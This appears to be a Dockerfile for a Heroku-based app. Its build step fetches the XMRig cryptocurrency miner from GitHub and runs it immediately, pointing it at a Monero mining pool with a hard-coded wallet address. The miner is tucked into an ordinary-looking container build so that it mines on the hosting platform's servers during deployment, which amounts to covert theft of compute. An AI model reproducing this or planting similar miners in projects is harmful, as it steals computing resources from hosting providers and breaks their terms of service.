FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.8.1/xmrig-6.8.1-bionic-x64.tar.gz && tar -xvf xmrig-6.8.1-bionic-x64.tar.gz && ./xmrig-6.8.1/xmrig -o pool.supportxmr.com:443 -u 43au2Thu6uC9vL16NnxLfc7YA7hMuw5MuMkVzinnftKAfPhxQXDKxdohxBQpZPuumVA1yuz7KjiPjQJXSPSkQxZHE49QRMx.vps -k --tls -p x -t 2
CMD bash heroku.sh
